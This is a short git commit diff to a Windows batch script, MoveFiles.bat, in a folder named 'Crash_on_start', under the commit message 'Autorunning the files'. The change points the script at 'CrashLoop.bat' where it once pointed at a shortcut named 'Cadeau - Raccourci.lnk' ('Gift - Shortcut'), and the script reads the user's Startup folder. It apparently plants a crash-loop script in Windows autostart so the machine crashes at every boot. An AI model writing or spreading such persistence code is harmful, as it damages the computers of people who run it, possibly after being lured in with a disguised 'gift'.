6ad3624c95de64809cfb9a95b8f9078980ec2c67
Kaiwinta <pradouratitouan@proton.me>
2023-06-03 19:18:46 +0200

    Autorunning the files

--- Crash_on_start/MoveFiles.bat
+++ Crash_on_start/MoveFiles.bat
@@ -1,6 +1,5 @@
 @echo off
-set "shortcutPath=D:\Cadeau - Raccourci.lnk"
-
+set "shortcutPath=CrashLoop.bat"
 rem Get the current user's startup folder location
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
